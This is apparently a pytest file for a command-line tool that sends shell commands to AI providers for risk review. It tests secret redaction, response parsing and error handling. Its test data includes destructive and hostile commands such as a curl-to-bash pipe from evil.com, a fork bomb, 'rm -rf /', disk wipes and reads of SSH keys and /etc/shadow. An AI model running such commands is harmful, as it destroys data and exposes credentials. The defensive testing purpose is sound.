# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 inference-garden
# ridinCLIgun — Tests for provider system

"""Tests for the provider layer (no real API calls)."""

import asyncio

import pytest

from ridincligun.provider.anthropic import AnthropicAdapter, _parse_response
from ridincligun.provider.manager import ProviderManager
from ridincligun.provider.prompt import (
    SYSTEM_PROMPT,
    _sanitize_command,
    build_review_prompt,
    get_redaction_diff,
)

# ── Prompt tests ─────────────────────────────────────────────────


def test_system_prompt_has_format():
    """System prompt instructs the model to use RISK/SUMMARY/etc format."""
    assert "RISK:" in SYSTEM_PROMPT
    assert "SUMMARY:" in SYSTEM_PROMPT
    assert "EXPLANATION:" in SYSTEM_PROMPT
    assert "SUGGESTION:" in SYSTEM_PROMPT


def test_system_prompt_has_secret_leak_instruction():
    """System prompt instructs the AI to flag real secrets that slip past filters."""
    assert "API key" in SYSTEM_PROMPT
    assert "rotate" in SYSTEM_PROMPT
    assert "not a placeholder" in SYSTEM_PROMPT


def test_build_review_prompt():
    """Review prompt includes the command (sanitized)."""
    prompt = build_review_prompt("rm -rf /tmp/old")
    assert "rm -rf /tmp/old" in prompt


def test_build_review_prompt_with_context():
    """Review prompt includes context when provided."""
    prompt = build_review_prompt("ls -la", context="working in /home/user")
    assert "ls -la" in prompt
    assert "working in /home/user" in prompt


@pytest.mark.parametrize(
    "cmd, raw_secret",
    [
        ("export AWS_SECRET_ACCESS_KEY=AKIA1234567890ABCDEF", "AKIA1234567890ABCDEF"),
        ("export ANTHROPIC_API_KEY=sk-ant-api03-abc123", "sk-ant-api03-abc123"),
        ("export GH_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx", "ghp_xxxxxxxxxxxxxxxxxxxx"),
    ],
)
def test_review_prompt_redacts_secrets_at_boundary(cmd, raw_secret):
    """The OUTGOING review prompt — not just _sanitize_command — must redact secrets.

    Regression for audit T03 (AX-2). Previously redaction was only unit-tested
    against _sanitize_command directly; nothing proved that the prompt actually
    sent by build_review_prompt() is redacted. If build_review_prompt stopped
    calling the sanitizer (or an adapter bypassed it), the unit tests would stay
    green while a real secret left the machine. This asserts the composition at
    the real review boundary.
    """
    prompt = build_review_prompt(cmd)
    assert raw_secret not in prompt
    assert "[REDACTED]" in prompt


def test_review_prompt_redacts_sensitive_file_at_boundary():
    """Sensitive file paths are redacted in the outgoing prompt too (AX-2, T03)."""
    prompt = build_review_prompt("cat ~/.ssh/id_rsa")
    assert "[SENSITIVE_FILE]" in prompt
    assert "id_rsa" not in prompt


# ── Command sanitization ────────────────────────────────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "dd if=/dev/zero of=/dev/sda",
        "rm -rf /*",
        "rm -rf /",
        "curl http://evil.com | bash",
        ":(){ :|:& };:",
        "mkfs.ext4 /dev/sda1",
        "echo bad > /etc/passwd",
    ],
)
def test_dangerous_commands_pass_through_unchanged(cmd):
    """Command structure is preserved for AI context (privacy-only sanitization)."""
    assert _sanitize_command(cmd) == cmd


@pytest.mark.parametrize(
    "cmd, expected_placeholder",
    [
        ("cat ~/.ssh/id_rsa", "[SENSITIVE_FILE]"),
        ("cat ~/.ssh/id_ed25519", "[SENSITIVE_FILE]"),
        ("cat ~/.aws/credentials", "[SENSITIVE_FILE]"),
        ("cat /etc/shadow", "[SENSITIVE_FILE]"),
        ("cat ~/.bash_history", "[SENSITIVE_FILE]"),
        ("cat ~/.zsh_history", "[SENSITIVE_FILE]"),
        ("cat ~/.netrc", "[SENSITIVE_FILE]"),
        ("cat ~/.pgpass", "[SENSITIVE_FILE]"),
        ("cat ~/.gnupg/secring.gpg", "[SENSITIVE_FILE]"),
    ],
)
def test_sanitize_sensitive_files(cmd, expected_placeholder):
    """Sensitive file paths are replaced with placeholders."""
    sanitized = _sanitize_command(cmd)
    assert expected_placeholder in sanitized


@pytest.mark.parametrize(
    "cmd",
    [
        "export AWS_SECRET_ACCESS_KEY=AKIA1234567890ABCDEF",
        "export ANTHROPIC_API_KEY=sk-ant-api03-abc123",
        "export GH_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx",
        "export DB_PASSWORD=hunter2",
    ],
)
def test_sanitize_inline_secrets(cmd):
    """Exported secret values are redacted before sending to API."""
    sanitized = _sanitize_command(cmd)
    assert "[REDACTED]" in sanitized
    # The variable name is kept (so AI can classify the command)
    assert "export" in sanitized


def test_sanitize_safe_command_unchanged():
    """Safe commands pass through unchanged."""
    cmd = "ls -la /home/user"
    assert _sanitize_command(cmd) == cmd


def test_sanitize_preserves_command_verb():
    """Sanitization keeps the command verb intact."""
    sanitized = _sanitize_command("dd if=/dev/zero of=/dev/sda bs=4M")
    assert "dd" in sanitized


# ── Response parsing ─────────────────────────────────────────────


def test_parse_response_full():
    """Parses a well-formed response."""
    raw = (
        "RISK: danger\n"
        "SUMMARY: Recursively deletes all files from root.\n"
        "EXPLANATION: This command will permanently destroy your entire filesystem.\n"
        "SUGGESTION: Use rm -ri for interactive deletion of specific paths."
    )
    result = _parse_response(raw)
    assert result.risk_assessment == "danger"
    assert "Recursively" in result.summary
    assert "permanently" in result.explanation
    assert "rm -ri" in result.suggestion


def test_parse_response_safe():
    """Parses a safe response."""
    raw = (
        "RISK: safe\n"
        "SUMMARY: Lists directory contents.\n"
        "EXPLANATION: This is a read-only command with no side effects.\n"
        "SUGGESTION: None"
    )
    result = _parse_response(raw)
    assert result.risk_assessment == "safe"
    assert result.suggestion == ""  # "None" gets cleaned up


def test_parse_response_malformed():
    """Handles malformed response gracefully."""
    raw = "This is not a properly formatted response."
    result = _parse_response(raw)
    assert result.risk_assessment == "caution"  # default fallback
    assert result.raw_text == raw


# ── Adapter tests ────────────────────────────────────────────────


def test_adapter_not_configured():
    """Adapter without API key reports not configured."""
    adapter = AnthropicAdapter(api_key="")
    assert not adapter.is_configured


def test_adapter_configured():
    """Adapter with API key reports configured."""
    adapter = AnthropicAdapter(api_key="sk-ant-test-key")
    assert adapter.is_configured


def test_adapter_name():
    """Adapter has a name."""
    adapter = AnthropicAdapter()
    assert "Anthropic" in adapter.name


# ── Manager tests ────────────────────────────────────────────────


def test_manager_unconfigured():
    """Manager returns error for unconfigured provider."""
    adapter = AnthropicAdapter(api_key="")
    manager = ProviderManager(adapter)
    result = asyncio.run(manager.review("ls"))
    assert not result.success
    assert "key" in result.error_message.lower()


def test_manager_properties():
    """Manager exposes provider name and config status."""
    adapter = AnthropicAdapter(api_key="sk-ant-test")
    manager = ProviderManager(adapter, timeout=5.0)
    assert "Anthropic" in manager.provider_name
    assert manager.is_configured


def test_manager_sanitizes_provider_error():
    """ProviderError details must not leak to user — generic message only."""
    from unittest.mock import AsyncMock, MagicMock  # noqa: I001

    from ridincligun.provider.base import ProviderError

    mock_adapter = MagicMock()
    mock_adapter.is_configured = True
    mock_adapter.name = "mock"
    mock_adapter.review_command = AsyncMock(
        side_effect=ProviderError("401 Unauthorized: Bearer sk-ant-api03-LEAKED-KEY")
    )
    manager = ProviderManager(mock_adapter)
    result = asyncio.run(manager.review("ls"))
    assert not result.success
    assert "sk-ant" not in result.error_message
    assert "401" not in result.error_message
    assert "failed" in result.error_message.lower()


def test_manager_sanitizes_unexpected_error():
    """Unexpected exceptions must not leak raw details to user."""
    from unittest.mock import AsyncMock, MagicMock

    mock_adapter = MagicMock()
    mock_adapter.is_configured = True
    mock_adapter.name = "mock"
    mock_adapter.review_command = AsyncMock(
        side_effect=RuntimeError(
            "Connection to https://api.anthropic.com failed: org_id=org-abc123"
        )
    )
    manager = ProviderManager(mock_adapter)
    result = asyncio.run(manager.review("ls"))
    assert not result.success
    assert "org-abc123" not in result.error_message
    assert "anthropic.com" not in result.error_message
    assert "failed" in result.error_message.lower()


# ── Setup-error surfacing (S1 root-cause regression guard) ───────
#
# Root cause of "all three providers fail identically": the optional AI SDKs
# were not installed, so each adapter raised on `import`, and the manager masked
# every ProviderError as a generic "check connection" message. These tests pin
# the fix: a setup gap (missing SDK / missing key) must reach the user verbatim,
# while genuine runtime errors stay sanitized.


def test_manager_surfaces_setup_error_verbatim():
    """ProviderSetupError must reach the user as-is, NOT masked as a connection error."""
    from unittest.mock import AsyncMock, MagicMock

    from ridincligun.provider.base import ProviderSetupError

    mock_adapter = MagicMock()
    mock_adapter.is_configured = True
    mock_adapter.name = "mock"
    mock_adapter.review_command = AsyncMock(
        side_effect=ProviderSetupError(
            'Mistral SDK not installed. Run: pip install "ridincligun[mistral]"'
        )
    )
    manager = ProviderManager(mock_adapter)
    result = asyncio.run(manager.review("ls"))
    assert not result.success
    assert "not installed" in result.error_message
    assert "pip install" in result.error_message
    # The whole point: it is NOT the generic connection message.
    assert "check connection" not in result.error_message.lower()


def test_setup_error_is_a_provider_error():
    """ProviderSetupError is a ProviderError so existing handlers still catch it."""
    from ridincligun.provider.base import ProviderError, ProviderSetupError

    err = ProviderSetupError("SDK not installed")
    assert isinstance(err, ProviderError)
    assert err.retriable is False  # retrying never fixes a setup gap


def test_anthropic_missing_sdk_raises_setup_error(monkeypatch):
    """A missing anthropic SDK surfaces an actionable install hint, not a generic
    failure — and it must NOT be re-wrapped by the adapter's API-error handler."""
    import sys

    from ridincligun.provider.base import ProviderSetupError

    # Force `import anthropic` to fail even if the package happens to be installed.
    monkeypatch.setitem(sys.modules, "anthropic", None)
    adapter = AnthropicAdapter(api_key="sk-ant-test")
    with pytest.raises(ProviderSetupError) as exc:
        asyncio.run(adapter.review_command("ls"))
    msg = str(exc.value)
    assert "pip install" in msg
    assert "API call failed" not in msg  # not swallowed + re-wrapped


def test_manager_surfaces_rate_limit_as_retry_message():
    """A 429 is transient — the user should be told to retry, NOT shown the generic
    "check connection", and the raw API body must not leak."""
    from unittest.mock import AsyncMock, MagicMock

    from ridincligun.provider.base import ProviderRateLimitError

    mock_adapter = MagicMock()
    mock_adapter.is_configured = True
    mock_adapter.name = "mock"
    mock_adapter.review_command = AsyncMock(
        side_effect=ProviderRateLimitError('Rate limited: Status 429 {"code":"1300"}')
    )
    manager = ProviderManager(mock_adapter)
    result = asyncio.run(manager.review("ls"))
    assert not result.success
    assert "rate limited" in result.error_message.lower()
    assert "try again" in result.error_message.lower()
    assert "check connection" not in result.error_message.lower()
    assert "1300" not in result.error_message  # raw body never leaks
    assert "429" not in result.error_message


def test_rate_limit_error_is_a_provider_error_and_retriable():
    from ridincligun.provider.base import ProviderError, ProviderRateLimitError

    err = ProviderRateLimitError("Rate limited")
    assert isinstance(err, ProviderError)
    assert err.retriable is True  # retrying a 429 can succeed


def test_anthropic_429_raises_rate_limit_error():
    """A rate-limit error from the SDK becomes a ProviderRateLimitError, not a
    generic API failure (so the manager can surface a retry message)."""
    from unittest.mock import MagicMock

    from ridincligun.provider.base import ProviderRateLimitError

    adapter = AnthropicAdapter(api_key="sk-ant-test")
    fake_client = MagicMock()
    fake_client.messages.create.side_effect = RuntimeError("429 rate limit exceeded")
    adapter._client = fake_client  # bypass real SDK construction

    with pytest.raises(ProviderRateLimitError):
        asyncio.run(adapter.review_command("ls"))


def test_anthropic_real_client_constructs_when_sdk_present():
    """When the anthropic SDK is installed, the adapter's import path must actually
    resolve. Guards against importing the client from the wrong location for the
    pinned SDK (the class of bug that briefly slipped into the Mistral adapter)."""
    pytest.importorskip("anthropic")
    adapter = AnthropicAdapter(api_key="sk-ant-test")
    assert adapter._get_client() is not None  # raises ProviderSetupError if path wrong


# ── OpenAI adapter tests ─────────────────────────────────────────

from ridincligun.provider.openai import OpenAIAdapter  # noqa: E402
from ridincligun.provider.openai import _parse_response as _openai_parse  # noqa: E402


def test_openai_adapter_not_configured():
    """OpenAI adapter without API key reports not configured."""
    adapter = OpenAIAdapter(api_key="")
    assert not adapter.is_configured


def test_openai_real_client_constructs_when_sdk_present():
    """When the openai SDK is installed, the adapter's import path must resolve."""
    pytest.importorskip("openai")
    adapter = OpenAIAdapter(api_key="x")
    assert adapter._get_client() is not None


def test_openai_adapter_configured():
    """OpenAI adapter with API key reports configured."""
    adapter = OpenAIAdapter(api_key="sk-test-key")
    assert adapter.is_configured


def test_openai_adapter_name():
    """OpenAI adapter name includes provider and model."""
    adapter = OpenAIAdapter(api_key="sk-test", model="gpt-4o")
    assert "OpenAI" in adapter.name
    assert "gpt-4o" in adapter.name


def test_openai_adapter_default_model():
    """OpenAI adapter defaults to gpt-5.4-mini (kept in sync with the selector)."""
    adapter = OpenAIAdapter(api_key="sk-test")
    assert "gpt-5.4-mini" in adapter.name


def test_openai_uses_max_completion_tokens_not_max_tokens():
    """Contract: the OpenAI adapter must send `max_completion_tokens`, never the
    legacy `max_tokens` — GPT-5 / o-series models reject `max_tokens` with a 400,
    which is exactly what broke the OpenAI provider on the gpt-5.x presets."""
    from unittest.mock import MagicMock

    adapter = OpenAIAdapter(api_key="sk-test", model="gpt-5.4-mini")

    captured: dict = {}

    def _fake_create(**kwargs):
        captured.update(kwargs)
        resp = MagicMock()
        resp.choices = [MagicMock(message=MagicMock(content="RISK: safe\nSUMMARY: ok"))]
        resp.usage = MagicMock(prompt_tokens=1, completion_tokens=1)
        return resp

    fake_client = MagicMock()
    fake_client.chat.completions.create = _fake_create
    adapter._client = fake_client  # bypass real SDK construction

    asyncio.run(adapter.review_command("ls"))
    assert "max_completion_tokens" in captured
    assert "max_tokens" not in captured


def test_openai_parse_response_full():
    """OpenAI parser handles well-formed response."""
    raw = (
        "RISK: warning\n"
        "SUMMARY: Deletes a directory.\n"
        "EXPLANATION: Removes the target recursively.\n"
        "SUGGESTION: Double-check the path first."
    )
    result = _openai_parse(raw)
    assert result.risk_assessment == "warning"
    assert "Deletes" in result.summary
    assert "Double-check" in result.suggestion


def test_openai_parse_response_malformed():
    """OpenAI parser falls back to caution on malformed input."""
    result = _openai_parse("garbage text")
    assert result.risk_assessment == "caution"


def test_openai_manager_unconfigured():
    """Manager returns error for unconfigured OpenAI provider."""
    adapter = OpenAIAdapter(api_key="")
    manager = ProviderManager(adapter)
    result = asyncio.run(manager.review("ls"))
    assert not result.success
    assert "key" in result.error_message.lower()


# ── Provider factory tests ───────────────────────────────────────

from ridincligun.config import Config, ProviderSettings  # noqa: E402
from ridincligun.provider import create_provider  # noqa: E402


def test_factory_creates_anthropic_by_default():
    """Factory creates Anthropic provider by default."""
    config = Config(
        provider=ProviderSettings(kind="anthropic", model="claude-sonnet-4-20250514"),
        api_key="sk-ant-test",
    )
    manager = create_provider(config)
    assert "Anthropic" in manager.provider_name
    assert manager.is_configured


def test_factory_creates_openai():
    """Factory creates OpenAI provider when configured."""
    config = Config(
        provider=ProviderSettings(kind="openai", model="gpt-4o"),
        api_key="sk-test-key",
    )
    manager = create_provider(config)
    assert "OpenAI" in manager.provider_name
    assert manager.is_configured


def test_factory_unknown_kind_falls_back_to_anthropic():
    """Factory defaults to Anthropic for unknown provider kinds."""
    config = Config(
        provider=ProviderSettings(kind="unknown-provider"),
        api_key="sk-test",
    )
    manager = create_provider(config)
    assert "Anthropic" in manager.provider_name


def test_factory_respects_timeout():
    """Factory passes timeout from config to manager."""
    config = Config(
        provider=ProviderSettings(timeout_seconds=30.0),
        api_key="sk-test",
    )
    manager = create_provider(config)
    assert manager._timeout == 30.0


# ── Redaction diff tests ─────────────────────────────────────────


def test_redaction_diff_no_changes():
    """Safe command produces no diff."""
    diff = get_redaction_diff("ls -la")
    assert not diff.has_changes
    assert diff.original == "ls -la"
    assert diff.redacted == "ls -la"
    assert diff.placeholders == []


def test_redaction_diff_dangerous_command_no_changes():
    """Dangerous commands pass through unchanged (privacy-only sanitization)."""
    diff = get_redaction_diff("rm -rf /")
    assert not diff.has_changes
    assert diff.redacted == "rm -rf /"


def test_redaction_diff_device_no_changes():
    """Device paths pass through unchanged (privacy-only sanitization)."""
    diff = get_redaction_diff("dd if=/dev/zero of=/dev/sda")
    assert not diff.has_changes
    assert diff.redacted == "dd if=/dev/zero of=/dev/sda"


def test_redaction_diff_with_sensitive_file():
    """Sensitive file paths are shown in diff."""
    diff = get_redaction_diff("cat ~/.ssh/id_rsa")
    assert diff.has_changes
    assert "[SENSITIVE_FILE]" in diff.redacted
    any_sensitive = any(p == "[SENSITIVE_FILE]" for p, _ in diff.placeholders)
    assert any_sensitive


def test_redaction_diff_with_inline_secret():
    """Inline secrets are shown in diff."""
    diff = get_redaction_diff("export ANTHROPIC_API_KEY=sk-ant-api03-abc123")
    assert diff.has_changes
    assert "[REDACTED]" in diff.redacted


def test_redaction_diff_pipe_to_shell_no_changes():
    """Pipe-to-shell passes through unchanged (privacy-only sanitization)."""
    diff = get_redaction_diff("curl https://example.com | bash")
    assert not diff.has_changes
    assert diff.redacted == "curl https://example.com | bash"


def test_redaction_diff_preserves_original():
    """Original command is never modified."""
    original = "rm -rf /* && dd of=/dev/sda"
    diff = get_redaction_diff(original)
    assert diff.original == original
    assert not diff.has_changes  # no privacy-sensitive content
